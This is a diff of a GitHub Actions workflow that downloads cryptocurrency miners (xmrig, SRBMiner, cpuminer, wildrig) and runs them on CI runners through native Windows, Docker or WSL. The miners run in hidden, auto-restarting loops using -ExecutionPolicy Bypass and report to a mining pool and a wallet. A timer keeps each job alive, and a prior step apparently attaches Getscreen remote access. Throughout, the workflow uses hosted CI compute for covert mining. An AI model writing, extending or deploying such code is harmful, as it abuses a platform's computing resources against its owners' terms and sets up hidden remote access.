@@ -103,7 +103,7 @@ jobs:
 
           echo "Updating file: $WORKFLOW_FILE"
 
-          # Using '|' delimiter instead of '/' to prevent inputs like 'rx/0' from breaking sed
+          # Using '|' delimiter instead of '/' to securely handle algorithms like 'rx/0'
           sed -i -E "s|default: '.*' # marker-runner|default: '${{ inputs.runner_type }}' # marker-runner|g" "$WORKFLOW_FILE"
           sed -i -E "s|default: '.*' # marker-winver|default: '${{ inputs.github_windows_version }}' # marker-winver|g" "$WORKFLOW_FILE"
           sed -i -E "s|default: '.*' # marker-exec|default: '${{ inputs.execution_type }}' # marker-exec|g" "$WORKFLOW_FILE"
@@ -186,122 +186,113 @@ jobs:
           $global:LASTEXITCODE = 0
           Write-Host "Getscreen successfully attached!"
 
-      - name: Run Miner (Windows Native)
-        if: ${{ inputs.execution_type == 'windows' }}
-        shell: powershell
-        run: |
-          Write-Host "Setting up Native Windows Miner: ${{ inputs.miner }}"
-          New-Item -ItemType Directory -Force -Path .\windows_miner | Out-Null
-          
-          $Miner = "${{ inputs.miner }}"
-          $ExeName = ""
-          $Args = ""
-
-          if ($Miner -eq "cpuminer-rplant") {
-            Invoke-WebRequest "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-win.zip" -OutFile "miner.zip" -UseBasicParsing
-            Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
-            $ExeName = "cpuminer-sse2.exe"
-            $Args = "-a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          } 
-          elseif ($Miner -eq "srbminer-multi") {
-            Invoke-WebRequest "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Windows.zip" -OutFile "miner.zip" -UseBasicParsing
-            Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
-            $ExeName = "SRBMiner-MULTI.exe"
-            $Args = "--disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          }
-          elseif ($Miner -eq "xmrig") {
-            Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip" -OutFile "miner.zip" -UseBasicParsing
-            Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
-            $ExeName = "xmrig.exe"
-            $Args = "-a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          }
-          elseif ($Miner -eq "wildrig-multi") {
-            Invoke-WebRequest "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-windows-0.40.8.zip" -OutFile "miner.zip" -UseBasicParsing
-            Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
-            $ExeName = "wildrig-multi.exe"
-            $Args = "--algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          }
-
-          $FoundExe = Get-ChildItem -Path .\windows_miner -Filter $ExeName -Recurse | Select-Object -First 1
-          
-          if ($FoundExe) {
-             Write-Host "Launching Miner: $($FoundExe.FullName) with args: $Args"
-             $Script = "while (1) { & `"$($FoundExe.FullName)`" $Args; Start-Sleep -Seconds 5 }"
-             Set-Content -Path "mine.ps1" -Value $Script
-             Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File mine.ps1" -WindowStyle Hidden
-          } else {
-             Write-Host "Error: Could not extract/find Windows miner executable."
-             exit 1
-          }
-
-      - name: Run Miner (Docker on Linux / Auto-Fallback to WSL)
-        if: ${{ inputs.execution_type == 'docker' || inputs.execution_type == 'wsl' }}
+      - name: Dynamic Miner Setup & Execution
         shell: powershell
         run: |
           $ExecType = "${{ inputs.execution_type }}"
-          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
           $Miner = "${{ inputs.miner }}"
-          $IsDockerSuccess = $false
+          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
           
-          # Setup common Linux variables
-          $DownloadUrl = ""
-          $ExtractCmd = "tar -xf miner.archive"
-          $RunCmd = ""
+          # 1. Variables for Windows Execution
+          $WinDownloadUrl = ""
+          $WinExeName = ""
+          $WinArgs = ""
+          
+          # 2. Variables for Linux Execution (Docker/WSL)
+          $LinDownloadUrl = ""
+          $LinExtractCmd = "tar -xf miner.archive"
+          $LinRunCmd = ""
 
           if ($Miner -eq "cpuminer-rplant") {
-            $DownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz"
-            $RunCmd = "./cpuminer-sse2 -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            $WinDownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-win.zip"
+            $WinExeName = "cpuminer-sse2.exe"
+            $WinArgs = "-a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            
+            $LinDownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz"
+            $LinRunCmd = "./cpuminer-sse2 -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
           } 
           elseif ($Miner -eq "srbminer-multi") {
-            $DownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
-            $RunCmd = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            $WinDownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Windows.zip"
+            $WinExeName = "SRBMiner-MULTI.exe"
+            $WinArgs = "--disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            
+            $LinDownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
+            $LinRunCmd = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
           }
           elseif ($Miner -eq "xmrig") {
-            $DownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
-            $RunCmd = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            $WinDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
+            $WinExeName = "xmrig.exe"
+            $WinArgs = "-a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            
+            $LinDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+            $LinRunCmd = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
           }
           elseif ($Miner -eq "wildrig-multi") {
-            $DownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
-            $RunCmd = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            $WinDownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-windows-0.40.8.zip"
+            $WinExeName = "wildrig-multi.exe"
+            $WinArgs = "--algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            
+            $LinDownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
+            $LinRunCmd = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
           }
+
+          $FallbackToWindows = $false
 
           if ($ExecType -eq 'docker') {
              Write-Host "Building Docker Image for Linux Mining..."
-             $DockerFile = @"
-             FROM public.ecr.aws/lts/ubuntu:latest
-             ENV DEBIAN_FRONTEND=noninteractive
-             RUN apt-get update && apt-get -y install wget tar ca-certificates xz-utils
-             WORKDIR /miner
-             RUN wget -qO miner.archive $DownloadUrl && $ExtractCmd
-             CMD ["sh", "-c", "$RunCmd"]
-"@
-             Set-Content -Path "Dockerfile" -Value $DockerFile
              
-             # Wrap in Start-Process to safely catch errors if Windows mode is active
+             # Using Add-Content instead of multi-line strings prevents YAML parser crashes
+             Set-Content -Path "Dockerfile" -Value "FROM public.ecr.aws/lts/ubuntu:latest"
+             Add-Content -Path "Dockerfile" -Value "ENV DEBIAN_FRONTEND=noninteractive"
+             Add-Content -Path "Dockerfile" -Value "RUN apt-get update && apt-get -y install wget tar ca-certificates xz-utils"
+             Add-Content -Path "Dockerfile" -Value "WORKDIR /miner"
+             Add-Content -Path "Dockerfile" -Value "RUN wget -qO miner.archive $LinDownloadUrl && $LinExtractCmd"
+             Add-Content -Path "Dockerfile" -Value "CMD [ `"sh`", `"-c`", `"$LinRunCmd`" ]"
+             
+             # Wrap in Start-Process to safely catch errors if Windows Container Mode is active
              $DockerBuild = Start-Process docker -ArgumentList "build -t $DockerName ." -NoNewWindow -Wait -PassThru
              
              if ($DockerBuild.ExitCode -eq 0) {
                 Write-Host "Docker build successful! Launching container..."
                 docker run -d --name $DockerName $DockerName
-                $IsDockerSuccess = $true
              } else {
-                Write-Host "WARNING: Docker Build Failed! (Often caused by Windows Container Mode)"
-                Write-Host "FALLBACK ENABLED: Switching to WSL Linux Subsystem Execution automatically..."
+                Write-Host "WARNING: Docker Build Failed! (Likely due to Windows Container mode)"
+                Write-Host "FALLBACK ENABLED: Switching to Windows Native Execution automatically..."
+                $FallbackToWindows = $true
              }
           }
 
-          if (($ExecType -eq 'wsl') -or (($ExecType -eq 'docker') -and ($IsDockerSuccess -eq $false))) {
+          if ($ExecType -eq 'wsl') {
              Write-Host "Setting up Linux Miner inside WSL native environment..."
-             wsl bash -c "mkdir -p /tmp/miner && cd /tmp/miner && wget -qO miner.archive $DownloadUrl && $ExtractCmd"
+             wsl bash -c "mkdir -p /tmp/miner && cd /tmp/miner && wget -qO miner.archive $LinDownloadUrl && $LinExtractCmd"
              
-             # Create background runner script
              wsl bash -c "echo '#!/bin/bash' > /tmp/miner/run.sh"
              wsl bash -c "echo 'cd /tmp/miner' >> /tmp/miner/run.sh"
-             wsl bash -c "echo 'while true; do $RunCmd; sleep 5; done' >> /tmp/miner/run.sh"
+             wsl bash -c "echo 'while true; do $LinRunCmd; sleep 5; done' >> /tmp/miner/run.sh"
              wsl bash -c "chmod +x /tmp/miner/run.sh"
              
              Write-Host "Launching WSL Miner Process..."
              Start-Process wsl -ArgumentList "-e bash /tmp/miner/run.sh" -WindowStyle Hidden
+          }
+
+          if ($ExecType -eq 'windows' -or $FallbackToWindows -eq $true) {
+             Write-Host "Setting up Native Windows Miner..."
+             New-Item -ItemType Directory -Force -Path .\windows_miner | Out-Null
+             
+             Invoke-WebRequest $WinDownloadUrl -OutFile "miner.zip" -UseBasicParsing
+             Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
+             
+             $FoundExe = Get-ChildItem -Path .\windows_miner -Filter $WinExeName -Recurse | Select-Object -First 1
+             
+             if ($FoundExe) {
+                Write-Host "Launching Windows Miner: $($FoundExe.FullName) with args: $WinArgs"
+                $Script = "while (1) { & `"$($FoundExe.FullName)`" $WinArgs; Start-Sleep -Seconds 5 }"
+                Set-Content -Path "mine.ps1" -Value $Script
+                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File mine.ps1" -WindowStyle Hidden
+             } else {
+                Write-Host "Error: Could not extract/find Windows miner executable."
+                exit 1
+             }
           }
 
       - name: Runtime Timer & Job Completion
@@ -311,18 +302,17 @@ jobs:
           Write-Host "Mining active. Task is sleeping for $TimeoutMins minutes to keep job alive..."
           Start-Sleep -Seconds ($TimeoutMins * 60)
 
-          Write-Host "Timeout reached. Attempting graceful cleanup..."
-          $ExecType = "${{ inputs.execution_type }}"
+          Write-Host "Timeout reached. Attempting graceful universal cleanup..."
           
-          if ($ExecType -eq "windows") {
-             Stop-Process -Name "cpuminer-sse2", "SRBMiner-MULTI", "xmrig", "wildrig-multi", "powershell" -Force -ErrorAction SilentlyContinue
-          } else {
-             # Gracefully attempt to clear docker containers OR wsl tasks regardless of fallback paths
-             $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
-             docker stop $DockerName -t 0 2>$null
-             docker rm $DockerName 2>$null
-             
-             wsl bash -c "pkill -f miner" 2>$null
-          }
+          # Clean up Windows processes
+          Stop-Process -Name "cpuminer-sse2", "SRBMiner-MULTI", "xmrig", "wildrig-multi", "powershell" -Force -ErrorAction SilentlyContinue
+          
+          # Clean up Docker (if it exists)
+          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
+          docker stop $DockerName -t 0 2>$null
+          docker rm $DockerName 2>$null
+          
+          # Clean up WSL (if it exists)
+          wsl bash -c "pkill -f miner" 2>$null
           
           Write-Host "Closing runner task so matrix can queue the next iteration..."
